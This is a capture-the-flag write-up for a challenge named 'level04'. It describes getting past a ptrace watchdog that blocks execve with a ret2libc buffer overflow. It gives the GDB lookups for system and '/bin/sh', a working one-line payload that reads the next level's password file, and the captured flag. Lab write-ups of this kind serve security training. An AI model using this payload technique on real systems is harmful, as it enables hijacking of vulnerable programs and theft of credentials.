# level04

The executable forks into a child process, to which we can feed a shellcode ; the issue is, the parent process watches the child with `ptrace`, and if it returns `11` - which is the syscall table number associated to `execve` - it kills it.

We'll have to circumvent this by using a different exploit.

## **The exploit**

We'll do a `ret2libc`, which uses lib functions and strings already present in the executable.

First, we've got to find the address of the `system` function. In GDB, we run :

```
print system
```

We get the address : `0xf7e6aed0`

Next, still in GDB, we're looking for an occurrence of `"/bin/sh"` :

```
find __libc_start_main,+99999999,"/bin/sh"
```

We find one at `0xf7f897ec`

Now, we need to replace `eip` with `system` and `eip+8` with `/bin/sh`, using the child process' `gets`.

We use GDB and find the offset of `eip`, which is `156`. We're reading to try a `ret2libc`.

## **The command**

We run the following command :

```
( python -c 'print("A" * 156 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xec\x97\xf8\xf7")' ; echo "cat /home/users/level05/.pass" ) | ./level04
```

## **The flag**

It works ! We get the flag for `level04` :

```
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```